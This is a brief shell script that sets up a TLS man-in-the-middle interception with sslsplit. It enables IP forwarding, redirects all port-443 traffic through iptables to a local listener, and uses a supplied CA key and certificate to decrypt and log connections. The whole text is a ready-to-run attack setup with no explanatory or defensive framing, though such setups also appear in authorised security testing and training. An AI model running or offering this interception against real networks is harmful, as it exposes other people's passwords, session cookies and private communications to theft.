mkdir MITM/logdir
mkdir /tmp/sslsplit

sysctl -w net.ipv4.ip_forward=1
iptables -t nat -F
iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443

sslsplit -l connections.log -j /tmp/sslsplit/ -S MITM/logdir/ -k MITM/ca.key -c MITM/ca.crt ssl 0.0.0.0 8443
